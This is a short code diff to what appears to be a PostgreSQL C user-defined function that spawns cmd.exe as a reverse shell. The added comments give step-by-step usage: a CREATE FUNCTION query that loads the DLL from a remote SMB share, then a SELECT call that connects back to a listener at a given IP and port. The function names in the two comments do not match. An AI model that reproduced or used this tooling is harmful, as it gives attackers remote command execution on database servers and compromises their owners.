@@ -53,3 +53,6 @@ DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))
 	CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
 	PG_RETURN_VOID();
 }
+
+/*to exploit from a network SMB you can run the following query - CREATE OR REPLACE FUNCTION udf-rev0-shell(text, integer) RETURNS void AS $$\\11.12.12.10\udfrevshell.dll$$, $$connect_back$$ LANGUAGE C STRICT;*/
+/*then -SELECT rev_shell($$192.168.100.111$$, 4323);*/
